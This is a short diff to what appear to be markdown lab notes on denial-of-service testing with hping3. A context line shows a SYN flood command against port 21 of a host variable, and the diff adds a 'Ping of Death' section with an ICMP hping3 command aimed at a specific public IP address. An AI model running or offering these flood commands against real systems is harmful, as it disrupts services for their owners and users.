@@ -45,3 +45,11 @@ sudo apt install hping3
 
 hping3 -V  -c 1000 -d 100 -S -p 21 --flood $ADRES_HOST_1
 ```
+
+### Ping of Death
+
+HOST2:
+
+```
+hping3 -i u10000 -1 -d 1200  46.101.122.137
+```
